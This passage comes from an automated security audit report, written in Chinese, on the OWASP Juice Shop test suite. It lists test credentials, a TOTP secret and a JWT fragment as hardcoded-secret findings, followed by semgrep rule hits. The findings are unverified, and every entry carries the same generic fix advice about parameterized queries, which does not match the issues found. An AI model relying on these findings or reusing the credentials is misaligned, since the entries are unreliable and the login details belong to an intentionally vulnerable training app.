password: 'OhG0dPlease1nsertLiquor!'
```

**修复建议：** 使用参数化查询、输入白名单校验、安全 API、最小权限和统一异常处理等方式进行加固。




### 4.156 Hardcoded Secret（HIGH）

- 文件：`test/api/payment.test.ts:20`
- 来源：custom-taint
- 置信度：0.5
- 已验证：否
- 状态：needs_review

```text
const { token } = await login(app, { email: 'jim@juice-sh.op', password: 'ncc-1701' })
```

**修复建议：** 使用参数化查询、输入白名单校验、安全 API、最小权限和统一异常处理等方式进行加固。




### 4.157 Hardcoded Secret（HIGH）

- 文件：`test/api/product-review.test.ts:101`
- 来源：custom-taint
- 置信度：0.5
- 已验证：否
- 状态：needs_review

```text
password: 'bW9jLmxpYW1nQGhjaW5pbW1pay5ucmVvamI='
```

**修复建议：** 使用参数化查询、输入白名单校验、安全 API、最小权限和统一异常处理等方式进行加固。




### 4.158 Hardcoded Secret（HIGH）

- 文件：`test/api/product-review.test.ts:115`
- 来源：custom-taint
- 置信度：0.5
- 已验证：否
- 状态：needs_review

```text
password: 'bW9jLmxpYW1nQGhjaW5pbW1pay5ucmVvamI='
```

**修复建议：** 使用参数化查询、输入白名单校验、安全 API、最小权限和统一异常处理等方式进行加固。




### 4.159 Hardcoded Secret（HIGH）

- 文件：`test/api/profile-image-upload.test.ts:31`
- 来源：custom-taint
- 置信度：0.5
- 已验证：否
- 状态：needs_review

```text
password: 'ncc-1701'
```

**修复建议：** 使用参数化查询、输入白名单校验、安全 API、最小权限和统一异常处理等方式进行加固。




### 4.160 Hardcoded Secret（HIGH）

- 文件：`test/api/profile-image-upload.test.ts:48`
- 来源：custom-taint
- 置信度：0.5
- 已验证：否
- 状态：needs_review

```text
password: 'ncc-1701'
```

**修复建议：** 使用参数化查询、输入白名单校验、安全 API、最小权限和统一异常处理等方式进行加固。




### 4.161 Hardcoded Secret（HIGH）

- 文件：`test/api/profile-image-upload.test.ts:77`
- 来源：custom-taint
- 置信度：0.5
- 已验证：否
- 状态：needs_review

```text
password: 'ncc-1701'
```

**修复建议：** 使用参数化查询、输入白名单校验、安全 API、最小权限和统一异常处理等方式进行加固。




### 4.162 Hardcoded Secret（HIGH）

- 文件：`test/api/profile-image-upload.test.ts:95`
- 来源：custom-taint
- 置信度：0.5
- 已验证：否
- 状态：needs_review

```text
password: 'ncc-1701'
```

**修复建议：** 使用参数化查询、输入白名单校验、安全 API、最小权限和统一异常处理等方式进行加固。




### 4.163 Hardcoded Secret（HIGH）

- 文件：`test/api/profile-image-upload.test.ts:110`
- 来源：custom-taint
- 置信度：0.5
- 已验证：否
- 状态：needs_review

```text
password: 'ncc-1701'
```

**修复建议：** 使用参数化查询、输入白名单校验、安全 API、最小权限和统一异常处理等方式进行加固。




### 4.164 Hardcoded Secret（HIGH）

- 文件：`test/api/profile-image-upload.test.ts:137`
- 来源：custom-taint
- 置信度：0.5
- 已验证：否
- 状态：needs_review

```text
password: 'ncc-1701'
```

**修复建议：** 使用参数化查询、输入白名单校验、安全 API、最小权限和统一异常处理等方式进行加固。




### 4.165 Hardcoded Secret（HIGH）

- 文件：`test/api/profile-image-upload.test.ts:161`
- 来源：custom-taint
- 置信度：0.5
- 已验证：否
- 状态：needs_review

```text
password: 'ncc-1701'
```

**修复建议：** 使用参数化查询、输入白名单校验、安全 API、最小权限和统一异常处理等方式进行加固。




### 4.166 Hardcoded Secret（HIGH）

- 文件：`test/api/quantity.test.ts:25`
- 来源：custom-taint
- 置信度：0.5
- 已验证：否
- 状态：needs_review

```text
password: 'ncc-1701'
```

**修复建议：** 使用参数化查询、输入白名单校验、安全 API、最小权限和统一异常处理等方式进行加固。




### 4.167 Hardcoded Secret（HIGH）

- 文件：`test/api/quantity.test.ts:37`
- 来源：custom-taint
- 置信度：0.5
- 已验证：否
- 状态：needs_review

```text
password: 'admin123'
```

**修复建议：** 使用参数化查询、输入白名单校验、安全 API、最小权限和统一异常处理等方式进行加固。




### 4.168 Hardcoded Secret（HIGH）

- 文件：`test/api/quantity.test.ts:49`
- 来源：custom-taint
- 置信度：0.5
- 已验证：否
- 状态：needs_review

```text
password: 'i am an awesome accountant'
```

**修复建议：** 使用参数化查询、输入白名单校验、安全 API、最小权限和统一异常处理等方式进行加固。




### 4.169 Hardcoded Secret（HIGH）

- 文件：`test/api/quantity.test.ts:61`
- 来源：custom-taint
- 置信度：0.5
- 已验证：否
- 状态：needs_review

```text
password: 'ncc-1701'
```

**修复建议：** 使用参数化查询、输入白名单校验、安全 API、最小权限和统一异常处理等方式进行加固。




### 4.170 Hardcoded Secret（HIGH）

- 文件：`test/api/quantity.test.ts:74`
- 来源：custom-taint
- 置信度：0.5
- 已验证：否
- 状态：needs_review

```text
password: 'admin123'
```

**修复建议：** 使用参数化查询、输入白名单校验、安全 API、最小权限和统一异常处理等方式进行加固。




### 4.171 Hardcoded Secret（HIGH）

- 文件：`test/api/quantity.test.ts:87`
- 来源：custom-taint
- 置信度：0.5
- 已验证：否
- 状态：needs_review

```text
password: 'i am an awesome accountant'
```

**修复建议：** 使用参数化查询、输入白名单校验、安全 API、最小权限和统一异常处理等方式进行加固。




### 4.172 Hardcoded Secret（HIGH）

- 文件：`test/api/quantity.test.ts:102`
- 来源：custom-taint
- 置信度：0.5
- 已验证：否
- 状态：needs_review

```text
password: 'ncc-1701'
```

**修复建议：** 使用参数化查询、输入白名单校验、安全 API、最小权限和统一异常处理等方式进行加固。




### 4.173 Hardcoded Secret（HIGH）

- 文件：`test/api/quantity.test.ts:115`
- 来源：custom-taint
- 置信度：0.5
- 已验证：否
- 状态：needs_review

```text
password: 'admin123'
```

**修复建议：** 使用参数化查询、输入白名单校验、安全 API、最小权限和统一异常处理等方式进行加固。




### 4.174 Hardcoded Secret（HIGH）

- 文件：`test/api/quantity.test.ts:128`
- 来源：custom-taint
- 置信度：0.5
- 已验证：否
- 状态：needs_review

```text
password: 'i am an awesome accountant'
```

**修复建议：** 使用参数化查询、输入白名单校验、安全 API、最小权限和统一异常处理等方式进行加固。




### 4.175 Hardcoded Secret（HIGH）

- 文件：`test/api/quantity.test.ts:140`
- 来源：custom-taint
- 置信度：0.5
- 已验证：否
- 状态：needs_review

```text
password: 'i am an awesome accountant'
```

**修复建议：** 使用参数化查询、输入白名单校验、安全 API、最小权限和统一异常处理等方式进行加固。




### 4.176 Hardcoded Secret（HIGH）

- 文件：`test/api/quantity.test.ts:152`
- 来源：custom-taint
- 置信度：0.5
- 已验证：否
- 状态：needs_review

```text
password: 'ncc-1701'
```

**修复建议：** 使用参数化查询、输入白名单校验、安全 API、最小权限和统一异常处理等方式进行加固。




### 4.177 Hardcoded Secret（HIGH）

- 文件：`test/api/quantity.test.ts:166`
- 来源：custom-taint
- 置信度：0.5
- 已验证：否
- 状态：needs_review

```text
password: 'ncc-1701'
```

**修复建议：** 使用参数化查询、输入白名单校验、安全 API、最小权限和统一异常处理等方式进行加固。




### 4.178 Hardcoded Secret（HIGH）

- 文件：`test/api/quantity.test.ts:180`
- 来源：custom-taint
- 置信度：0.5
- 已验证：否
- 状态：needs_review

```text
password: 'i am an awesome accountant'
```

**修复建议：** 使用参数化查询、输入白名单校验、安全 API、最小权限和统一异常处理等方式进行加固。




### 4.179 Hardcoded Secret（HIGH）

- 文件：`test/api/quantity.test.ts:193`
- 来源：custom-taint
- 置信度：0.5
- 已验证：否
- 状态：needs_review

```text
password: 'i am an awesome accountant'
```

**修复建议：** 使用参数化查询、输入白名单校验、安全 API、最小权限和统一异常处理等方式进行加固。




### 4.180 Hardcoded Secret（HIGH）

- 文件：`test/api/quantity.test.ts:207`
- 来源：custom-taint
- 置信度：0.5
- 已验证：否
- 状态：needs_review

```text
password: 'i am an awesome accountant'
```

**修复建议：** 使用参数化查询、输入白名单校验、安全 API、最小权限和统一异常处理等方式进行加固。




### 4.181 Hardcoded Secret（HIGH）

- 文件：`test/api/quantity.test.ts:219`
- 来源：custom-taint
- 置信度：0.5
- 已验证：否
- 状态：needs_review

```text
password: 'admin123'
```

**修复建议：** 使用参数化查询、输入白名单校验、安全 API、最小权限和统一异常处理等方式进行加固。




### 4.182 Hardcoded Secret（HIGH）

- 文件：`test/api/quantity.test.ts:231`
- 来源：custom-taint
- 置信度：0.5
- 已验证：否
- 状态：needs_review

```text
password: 'ncc-1701'
```

**修复建议：** 使用参数化查询、输入白名单校验、安全 API、最小权限和统一异常处理等方式进行加固。




### 4.183 Hardcoded Secret（HIGH）

- 文件：`test/api/user-profile.test.ts:21`
- 来源：custom-taint
- 置信度：0.5
- 已验证：否
- 状态：needs_review

```text
const { token } = await login(app, { email: 'jim@juice-sh.op', password: 'ncc-1701' })
```

**修复建议：** 使用参数化查询、输入白名单校验、安全 API、最小权限和统一异常处理等方式进行加固。




### 4.184 Hardcoded Secret（HIGH）

- 文件：`test/api/user.test.ts:52`
- 来源：custom-taint
- 置信度：0.5
- 已验证：否
- 状态：needs_review

```text
password: 'hooooorst'
```

**修复建议：** 使用参数化查询、输入白名单校验、安全 API、最小权限和统一异常处理等方式进行加固。




### 4.185 Hardcoded Secret（HIGH）

- 文件：`test/api/user.test.ts:68`
- 来源：custom-taint
- 置信度：0.5
- 已验证：否
- 状态：needs_review

```text
password: 'hooooorst',
```

**修复建议：** 使用参数化查询、输入白名单校验、安全 API、最小权限和统一异常处理等方式进行加固。




### 4.186 Hardcoded Secret（HIGH）

- 文件：`test/api/user.test.ts:136`
- 来源：custom-taint
- 置信度：0.5
- 已验证：否
- 状态：needs_review

```text
password: 'hooooorst',
```

**修复建议：** 使用参数化查询、输入白名单校验、安全 API、最小权限和统一异常处理等方式进行加固。




### 4.187 Hardcoded Secret（HIGH）

- 文件：`test/api/user.test.ts:154`
- 来源：custom-taint
- 置信度：0.5
- 已验证：否
- 状态：needs_review

```text
password: 'hooooorst',
```

**修复建议：** 使用参数化查询、输入白名单校验、安全 API、最小权限和统一异常处理等方式进行加固。




### 4.188 Hardcoded Secret（HIGH）

- 文件：`test/api/user.test.ts:172`
- 来源：custom-taint
- 置信度：0.5
- 已验证：否
- 状态：needs_review

```text
password: 'hooooorst',
```

**修复建议：** 使用参数化查询、输入白名单校验、安全 API、最小权限和统一异常处理等方式进行加固。




### 4.189 Hardcoded Secret（HIGH）

- 文件：`test/api/user.test.ts:189`
- 来源：custom-taint
- 置信度：0.5
- 已验证：否
- 状态：needs_review

```text
password: 'does.not.matter'
```

**修复建议：** 使用参数化查询、输入白名单校验、安全 API、最小权限和统一异常处理等方式进行加固。




### 4.190 Hardcoded Secret（HIGH）

- 文件：`test/api/user.test.ts:240`
- 来源：custom-taint
- 置信度：0.5
- 已验证：否
- 状态：needs_review

```text
password: 'bW9jLmxpYW1nQGhjaW5pbW1pay5ucmVvamI='
```

**修复建议：** 使用参数化查询、输入白名单校验、安全 API、最小权限和统一异常处理等方式进行加固。




### 4.191 Hardcoded Secret（HIGH）

- 文件：`test/api/user.test.ts:289`
- 来源：custom-taint
- 置信度：0.5
- 已验证：否
- 状态：needs_review

```text
password: 'bW9jLmxpYW1nQGhjaW5pbW1pay5ucmVvamI='
```

**修复建议：** 使用参数化查询、输入白名单校验、安全 API、最小权限和统一异常处理等方式进行加固。




### 4.192 Hardcoded Secret（HIGH）

- 文件：`test/api/user.test.ts:304`
- 来源：custom-taint
- 置信度：0.5
- 已验证：否
- 状态：needs_review

```text
password: 'bW9jLmxpYW1nQGhjaW5pbW1pay5ucmVvamI='
```

**修复建议：** 使用参数化查询、输入白名单校验、安全 API、最小权限和统一异常处理等方式进行加固。




### 4.193 Hardcoded Secret（HIGH）

- 文件：`test/api/user.test.ts:318`
- 来源：custom-taint
- 置信度：0.5
- 已验证：否
- 状态：needs_review

```text
password: 'bW9jLmxpYW1nQGhjaW5pbW1pay5ucmVvamI='
```

**修复建议：** 使用参数化查询、输入白名单校验、安全 API、最小权限和统一异常处理等方式进行加固。




### 4.194 Hardcoded Secret（HIGH）

- 文件：`test/api/wallet.test.ts:81`
- 来源：custom-taint
- 置信度：0.5
- 已验证：否
- 状态：needs_review

```text
.send({ email, password: 'password', passwordRepeat: 'password', securityQuestion: { id: 1 }, securityAnswer: 'answer' })
```

**修复建议：** 使用参数化查询、输入白名单校验、安全 API、最小权限和统一异常处理等方式进行加固。




### 4.195 Hardcoded Secret（HIGH）

- 文件：`test/api/wallet.test.ts:86`
- 来源：custom-taint
- 置信度：0.5
- 已验证：否
- 状态：needs_review

```text
.send({ email, password: 'password' })
```

**修复建议：** 使用参数化查询、输入白名单校验、安全 API、最小权限和统一异常处理等方式进行加固。




### 4.196 Hardcoded Secret（HIGH）

- 文件：`test/cypress/e2e/administration.spec.ts:5`
- 来源：custom-taint
- 置信度：0.5
- 已验证：否
- 状态：needs_review

```text
password: 'admin123'
```

**修复建议：** 使用参数化查询、输入白名单校验、安全 API、最小权限和统一异常处理等方式进行加固。




### 4.197 Hardcoded Secret（HIGH）

- 文件：`test/cypress/e2e/b2bOrder.spec.ts:6`
- 来源：custom-taint
- 置信度：0.5
- 已验证：否
- 状态：needs_review

```text
cy.login({ email: 'admin', password: 'admin123' })
```

**修复建议：** 使用参数化查询、输入白名单校验、安全 API、最小权限和统一异常处理等方式进行加固。




### 4.198 Hardcoded Secret（HIGH）

- 文件：`test/cypress/e2e/b2bOrder.spec.ts:37`
- 来源：custom-taint
- 置信度：0.5
- 已验证：否
- 状态：needs_review

```text
cy.login({ email: 'admin', password: 'admin123' })
```

**修复建议：** 使用参数化查询、输入白名单校验、安全 API、最小权限和统一异常处理等方式进行加固。




### 4.199 Hardcoded Secret（HIGH）

- 文件：`test/cypress/e2e/basket.spec.ts:4`
- 来源：custom-taint
- 置信度：0.5
- 已验证：否
- 状态：needs_review

```text
cy.login({ email: 'admin', password: 'admin123' })
```

**修复建议：** 使用参数化查询、输入白名单校验、安全 API、最小权限和统一异常处理等方式进行加固。




### 4.200 Hardcoded Secret（HIGH）

- 文件：`test/cypress/e2e/basket.spec.ts:76`
- 来源：custom-taint
- 置信度：0.5
- 已验证：否
- 状态：needs_review

```text
cy.login({ email: 'jim', password: 'ncc-1701' })
```

**修复建议：** 使用参数化查询、输入白名单校验、安全 API、最小权限和统一异常处理等方式进行加固。




### 4.201 Hardcoded Secret（HIGH）

- 文件：`test/cypress/e2e/changePassword.spec.ts:6`
- 来源：custom-taint
- 置信度：0.5
- 已验证：否
- 状态：needs_review

```text
password: 'focusOnScienceMorty!focusOnScience'
```

**修复建议：** 使用参数化查询、输入白名单校验、安全 API、最小权限和统一异常处理等方式进行加固。




### 4.202 Hardcoded Secret（HIGH）

- 文件：`test/cypress/e2e/changePassword.spec.ts:25`
- 来源：custom-taint
- 置信度：0.5
- 已验证：否
- 状态：needs_review

```text
password: 'OhG0dPlease1nsertLiquor!'
```

**修复建议：** 使用参数化查询、输入白名单校验、安全 API、最小权限和统一异常处理等方式进行加固。




### 4.203 Hardcoded Secret（HIGH）

- 文件：`test/cypress/e2e/changePassword.spec.ts:31`
- 来源：custom-taint
- 置信度：0.5
- 已验证：否
- 状态：needs_review

```text
cy.login({ email: 'bender', password: 'slurmCl4ssic' })
```

**修复建议：** 使用参数化查询、输入白名单校验、安全 API、最小权限和统一异常处理等方式进行加固。




### 4.204 Hardcoded Secret（HIGH）

- 文件：`test/cypress/e2e/chatbot.spec.ts:8`
- 来源：custom-taint
- 置信度：0.5
- 已验证：否
- 状态：needs_review

```text
cy.login({ email: 'admin', password: 'admin123' })
```

**修复建议：** 使用参数化查询、输入白名单校验、安全 API、最小权限和统一异常处理等方式进行加固。




### 4.205 Hardcoded Secret（HIGH）

- 文件：`test/cypress/e2e/complain.spec.ts:5`
- 来源：custom-taint
- 置信度：0.5
- 已验证：否
- 状态：needs_review

```text
password: 'admin123'
```

**修复建议：** 使用参数化查询、输入白名单校验、安全 API、最小权限和统一异常处理等方式进行加固。




### 4.206 Hardcoded Secret（HIGH）

- 文件：`test/cypress/e2e/contact.spec.ts:11`
- 来源：custom-taint
- 置信度：0.5
- 已验证：否
- 状态：needs_review

```text
cy.login({ email: 'admin', password: 'admin123' })
```

**修复建议：** 使用参数化查询、输入白名单校验、安全 API、最小权限和统一异常处理等方式进行加固。




### 4.207 Hardcoded Secret（HIGH）

- 文件：`test/cypress/e2e/contact.spec.ts:47`
- 来源：custom-taint
- 置信度：0.5
- 已验证：否
- 状态：needs_review

```text
cy.login({ email: 'admin', password: 'admin123' })
```

**修复建议：** 使用参数化查询、输入白名单校验、安全 API、最小权限和统一异常处理等方式进行加固。




### 4.208 Hardcoded Secret（HIGH）

- 文件：`test/cypress/e2e/dataErasure.spec.ts:3`
- 来源：custom-taint
- 置信度：0.5
- 已验证：否
- 状态：needs_review

```text
cy.login({ email: 'admin', password: 'admin123' })
```

**修复建议：** 使用参数化查询、输入白名单校验、安全 API、最小权限和统一异常处理等方式进行加固。




### 4.209 Hardcoded Secret（HIGH）

- 文件：`test/cypress/e2e/dataExport.spec.ts:24`
- 来源：custom-taint
- 置信度：0.5
- 已验证：否
- 状态：needs_review

```text
cy.login({ email: 'admun', password: 'admun123' })
```

**修复建议：** 使用参数化查询、输入白名单校验、安全 API、最小权限和统一异常处理等方式进行加固。




### 4.210 Hardcoded Secret（HIGH）

- 文件：`test/cypress/e2e/deluxe.spec.ts:4`
- 来源：custom-taint
- 置信度：0.5
- 已验证：否
- 状态：needs_review

```text
cy.login({ email: 'jim', password: 'ncc-1701' })
```

**修复建议：** 使用参数化查询、输入白名单校验、安全 API、最小权限和统一异常处理等方式进行加固。




### 4.211 Hardcoded Secret（HIGH）

- 文件：`test/cypress/e2e/deluxe.spec.ts:21`
- 来源：custom-taint
- 置信度：0.5
- 已验证：否
- 状态：needs_review

```text
password: 'ncc-1701'
```

**修复建议：** 使用参数化查询、输入白名单校验、安全 API、最小权限和统一异常处理等方式进行加固。




### 4.212 Hardcoded Secret（HIGH）

- 文件：`test/cypress/e2e/noSql.spec.ts:8`
- 来源：custom-taint
- 置信度：0.5
- 已验证：否
- 状态：needs_review

```text
cy.login({ email: 'admin', password: 'admin123' })
```

**修复建议：** 使用参数化查询、输入白名单校验、安全 API、最小权限和统一异常处理等方式进行加固。




### 4.213 Hardcoded Secret（HIGH）

- 文件：`test/cypress/e2e/noSql.spec.ts:53`
- 来源：custom-taint
- 置信度：0.5
- 已验证：否
- 状态：needs_review

```text
cy.login({ email: 'admin', password: 'admin123' })
```

**修复建议：** 使用参数化查询、输入白名单校验、安全 API、最小权限和统一异常处理等方式进行加固。




### 4.214 Hardcoded Secret（HIGH）

- 文件：`test/cypress/e2e/noSql.spec.ts:76`
- 来源：custom-taint
- 置信度：0.5
- 已验证：否
- 状态：needs_review

```text
cy.login({ email: 'mc.safesearch', password: 'Mr. N00dles' })
```

**修复建议：** 使用参数化查询、输入白名单校验、安全 API、最小权限和统一异常处理等方式进行加固。




### 4.215 Hardcoded Secret（HIGH）

- 文件：`test/cypress/e2e/noSql.spec.ts:120`
- 来源：custom-taint
- 置信度：0.5
- 已验证：否
- 状态：needs_review

```text
cy.login({ email: 'mc.safesearch', password: 'Mr. N00dles' })
```

**修复建议：** 使用参数化查询、输入白名单校验、安全 API、最小权限和统一异常处理等方式进行加固。




### 4.216 Hardcoded Secret（HIGH）

- 文件：`test/cypress/e2e/passwordHashLeak.spec.ts:3`
- 来源：custom-taint
- 置信度：0.5
- 已验证：否
- 状态：needs_review

```text
cy.login({ email: 'admin@juice-sh.op', password: 'admin123' })
```

**修复建议：** 使用参数化查询、输入白名单校验、安全 API、最小权限和统一异常处理等方式进行加固。




### 4.217 Hardcoded Secret（HIGH）

- 文件：`test/cypress/e2e/profile.spec.ts:3`
- 来源：custom-taint
- 置信度：0.5
- 已验证：否
- 状态：needs_review

```text
cy.login({ email: 'admin', password: 'admin123' })
```

**修复建议：** 使用参数化查询、输入白名单校验、安全 API、最小权限和统一异常处理等方式进行加固。




### 4.218 Hardcoded Secret（HIGH）

- 文件：`test/cypress/e2e/register.spec.ts:10`
- 来源：custom-taint
- 置信度：0.5
- 已验证：否
- 状态：needs_review

```text
password: 'admin123'
```

**修复建议：** 使用参数化查询、输入白名单校验、安全 API、最小权限和统一异常处理等方式进行加固。




### 4.219 Hardcoded Secret（HIGH）

- 文件：`test/cypress/e2e/register.spec.ts:84`
- 来源：custom-taint
- 置信度：0.5
- 已验证：否
- 状态：needs_review

```text
password: 'ThereCanBeOnlyOne'
```

**修复建议：** 使用参数化查询、输入白名单校验、安全 API、最小权限和统一异常处理等方式进行加固。




### 4.220 Hardcoded Secret（HIGH）

- 文件：`test/cypress/e2e/restApi.spec.ts:4`
- 来源：custom-taint
- 置信度：0.5
- 已验证：否
- 状态：needs_review

```text
cy.login({ email: 'admin', password: 'admin123' })
```

**修复建议：** 使用参数化查询、输入白名单校验、安全 API、最小权限和统一异常处理等方式进行加固。




### 4.221 Hardcoded Secret（HIGH）

- 文件：`test/cypress/e2e/restApi.spec.ts:82`
- 来源：custom-taint
- 置信度：0.5
- 已验证：否
- 状态：needs_review

```text
password: 'admin123'
```

**修复建议：** 使用参数化查询、输入白名单校验、安全 API、最小权限和统一异常处理等方式进行加固。




### 4.222 Hardcoded Secret（HIGH）

- 文件：`test/cypress/e2e/search.spec.ts:56`
- 来源：custom-taint
- 置信度：0.5
- 已验证：否
- 状态：needs_review

```text
password: 'admin123'
```

**修复建议：** 使用参数化查询、输入白名单校验、安全 API、最小权限和统一异常处理等方式进行加固。




### 4.223 Hardcoded Secret（HIGH）

- 文件：`test/cypress/e2e/search.spec.ts:83`
- 来源：custom-taint
- 置信度：0.5
- 已验证：否
- 状态：needs_review

```text
password: 'admin123'
```

**修复建议：** 使用参数化查询、输入白名单校验、安全 API、最小权限和统一异常处理等方式进行加固。




### 4.224 Hardcoded Secret（HIGH）

- 文件：`test/cypress/e2e/totpSetup.spec.ts:6`
- 来源：custom-taint
- 置信度：0.5
- 已验证：否
- 状态：needs_review

```text
password: 'EinBelegtesBrotMitSchinkenSCHINKEN!',
```

**修复建议：** 使用参数化查询、输入白名单校验、安全 API、最小权限和统一异常处理等方式进行加固。




### 4.225 Hardcoded Secret（HIGH）

- 文件：`test/cypress/e2e/totpSetup.spec.ts:7`
- 来源：custom-taint
- 置信度：0.5
- 已验证：否
- 状态：needs_review

```text
totpSecret: 'IFTXE3SPOEYVURT2MRYGI52TKJ4HC3KH'
```

**修复建议：** 使用参数化查询、输入白名单校验、安全 API、最小权限和统一异常处理等方式进行加固。




### 4.226 Hardcoded Secret（HIGH）

- 文件：`test/cypress/e2e/totpSetup.spec.ts:20`
- 来源：custom-taint
- 置信度：0.5
- 已验证：否
- 状态：needs_review

```text
password: 'K1f.....................'
```

**修复建议：** 使用参数化查询、输入白名单校验、安全 API、最小权限和统一异常处理等方式进行加固。




### 4.227 Hardcoded Secret（HIGH）

- 文件：`test/server/currentUser.unit.test.ts:31`
- 来源：custom-taint
- 置信度：0.5
- 已验证：否
- 状态：needs_review

```text
req.cookies.token = 'eyJ0eXAiOiJKV1QiLCJhbGciOiJSUzI1NiJ9.eyJkYXRhIjp7ImlkIjoxLCJlbWFpbCI6ImFkbWluQGp1aWNlLXNoLm9wIiwibGFzdExvZ2luSXAiOiIwLjAuMC4wIiwicHJvZmlsZUltYWdlIjoiZGVmYXVsdC5zdmcifSwiaWF0IjoxNT
```

**修复建议：** 使用参数化查询、输入白名单校验、安全 API、最小权限和统一异常处理等方式进行加固。




### 4.228 github-actions-mutable-action-tag（MEDIUM）

- 文件：`C:\Users\52697\Desktop\2026小学期\AuditAgentX\data\projects\proj_27e19404\.github\workflows\ci.yml:188`
- 来源：semgrep
- 置信度：0.5
- 已验证：否
- 状态：needs_review

```text
requires login
```

**修复建议：** 使用参数化查询、输入白名单校验、安全 API、最小权限和统一异常处理等方式进行加固。




### 4.229 github-actions-mutable-action-tag（MEDIUM）

- 文件：`C:\Users\52697\Desktop\2026小学期\AuditAgentX\data\projects\proj_27e19404\.github\workflows\codeql-analysis.yml:23`
- 来源：semgrep
- 置信度：0.5
- 已验证：否
- 状态：needs_review

```text
requires login
```

**修复建议：** 使用参数化查询、输入白名单校验、安全 API、最小权限和统一异常处理等方式进行加固。




### 4.230 github-actions-mutable-action-tag（MEDIUM）

- 文件：`C:\Users\52697\Desktop\2026小学期\AuditAgentX\data\projects\proj_27e19404\.github\workflows\codeql-analysis.yml:34`
- 来源：semgrep
- 置信度：0.5
- 已验证：否
- 状态：needs_review

```text
requires login
```

**修复建议：** 使用参数化查询、输入白名单校验、安全 API、最小权限和统一异常处理等方式进行加固。




### 4.231 github-actions-mutable-action-tag（MEDIUM）

- 文件：`C:\Users\52697\Desktop\2026小学期\AuditAgentX\data\projects\proj_27e19404\.github\workflows\codeql-analysis.yml:36`
- 来源：semgrep
- 置信度：0.5
- 已验证：否
- 状态：needs_review

```text
requires login
```

**修复建议：** 使用参数化查询、输入白名单校验、安全 API、最小权限和统一异常处理等方式进行加固。




### 4.232 github-actions-mutable-action-tag（MEDIUM）

- 文件：`C:\Users\52697\Desktop\2026小学期\AuditAgentX\data\projects\proj_27e19404\.github\workflows\image_actions.yml:30`
- 来源：semgrep
- 置信度：0.5
- 已验证：否
- 状态：needs_review

```text
requires login
```

**修复建议：** 使用参数化查询、输入白名单校验、安全 API、最小权限和统一异常处理等方式进行加固。




### 4.233 github-actions-mutable-action-tag（MEDIUM）

- 文件：`C:\Users\52697\Desktop\2026小学期\AuditAgentX\data\projects\proj_27e19404\.github\workflows\image_actions.yml:33`
- 来源：semgrep
- 置信度：0.5
- 已验证：否
- 状态：needs_review

```text
requires login
```

**修复建议：** 使用参数化查询、输入白名单校验、安全 API、最小权限和统一异常处理等方式进行加固。




### 4.234 github-actions-mutable-action-tag（MEDIUM）

- 文件：`C:\Users\52697\Desktop\2026小学期\AuditAgentX\data\projects\proj_27e19404\.github\workflows\image_actions.yml:42`
- 来源：semgrep
- 置信度：0.5
- 已验证：否
- 状态：needs_review

```text
requires login
```

**修复建议：** 使用参数化查询、输入白名单校验、安全 API、最小权限和统一异常处理等方式进行加固。




### 4.235 npm-missing-minimum-release-age（MEDIUM）

- 文件：`C:\Users\52697\Desktop\2026小学期\AuditAgentX\data\projects\proj_27e19404\.npmrc:1`
- 来源：semgrep
- 置信度：0.5
- 已验证：否
- 状态：needs_review

```text
requires login
```

**修复建议：** 使用参数化查询、输入白名单校验、安全 API、最小权限和统一异常处理等方式进行加固。




### 4.236 npm-missing-minimum-release-age（MEDIUM）

- 文件：`C:\Users\52697\Desktop\2026小学期\AuditAgentX\data\projects\proj_27e19404\frontend\.npmrc:1`
- 来源：semgrep
- 置信度：0.5
- 已验证：否
- 状态：needs_review

```text
requires login
```

**修复建议：** 使用参数化查询、输入白名单校验、安全 API、最小权限和统一异常处理等方式进行加固。




### 4.237 prototype-pollution-loop（MEDIUM）

- 文件：`C:\Users\52697\Desktop\2026小学期\AuditAgentX\data\projects\proj_27e19404\frontend\src\hacking-instructor\helpers\helpers.ts:49`
- 来源：semgrep
- 置信度：0.5
- 已验证：否
- 状态：needs_review

```text
requires login
```

**修复建议：** 使用参数化查询、输入白名单校验、安全 API、最小权限和统一异常处理等方式进行加固。




### 4.238 detect-non-literal-regexp（MEDIUM）

- 文件：`C:\Users\52697\Desktop\2026小学期\AuditAgentX\data\projects\proj_27e19404\lib\codingChallenges.ts:76`
- 来源：semgrep
- 置信度：0.5
- 已验证：否
- 状态：needs_review

```text
requires login
```

**修复建议：** 使用参数化查询、输入白名单校验、安全 API、最小权限和统一异常处理等方式进行加固。




### 4.239 detect-non-literal-regexp（MEDIUM）

- 文件：`C:\Users\52697\Desktop\2026小学期\AuditAgentX\data\projects\proj_27e19404\lib\codingChallenges.ts:78`
- 来源：semgrep
- 置信度：0.5
- 已验证：否
- 状态：needs_review

```text
requires login
```

**修复建议：** 使用参数化查询、输入白名单校验、安全 API、最小权限和统一异常处理等方式进行加固。




### 4.240 hardcoded-hmac-key（MEDIUM）

- 文件：`C:\Users\52697\Desktop\2026小学期\AuditAgentX\data\projects\proj_27e19404\lib\insecurity.ts:42`
- 来源：semgrep
- 置信度：0.5
- 已验证：否
- 状态：needs_review

```text
requires login
```

**修复建议：** 使用参数化查询、输入白名单校验、安全 API、最小权限和统一异常处理等方式进行加固。




### 4.241 hardcoded-jwt-secret（MEDIUM）

- 文件：`C:\Users\52697\Desktop\2026小学期\AuditAgentX\data\projects\proj_27e19404\lib\insecurity.ts:54`
- 来源：semgrep
- 置信度：0.5
- 已验证：否
- 状态：needs_review

```text
requires login
```

**修复建议：** 使用参数化查询、输入白名单校验、安全 API、最小权限和统一异常处理等方式进行加固。




### 4.242 hardcoded-hmac-key（MEDIUM）

- 文件：`C:\Users\52697\Desktop\2026小学期\AuditAgentX\data\projects\proj_27e19404\lib\insecurity.ts:150`
- 来源：semgrep
- 置信度：0.5
- 已验证：否
- 状态：needs_review

```text
requires login
```

**修复建议：** 使用参数化查询、输入白名单校验、安全 API、最小权限和统一异常处理等方式进行加固。




### 4.243 express-detect-notevil-usage（MEDIUM）

- 文件：`C:\Users\52697\Desktop\2026小学期\AuditAgentX\data\projects\proj_27e19404\routes\b2bOrder.ts:23`
- 来源：semgrep
- 置信度：0.5
- 已验证：否
- 状态：needs_review

```text
requires login
```

**修复建议：** 使用参数化查询、输入白名单校验、安全 API、最小权限和统一异常处理等方式进行加固。




### 4.244 eval-detected（MEDIUM）

- 文件：`C:\Users\52697\Desktop\2026小学期\AuditAgentX\data\projects\proj_27e19404\routes\captcha.ts:22`
- 来源：semgrep
- 置信度：0.5
- 已验证：否
- 状态：needs_review

```text
requires login
```

**修复建议：** 使用参数化查询、输入白名单校验、安全 API、最小权限和统一异常处理等方式进行加固。




### 4.245 express-res-sendfile（MEDIUM）

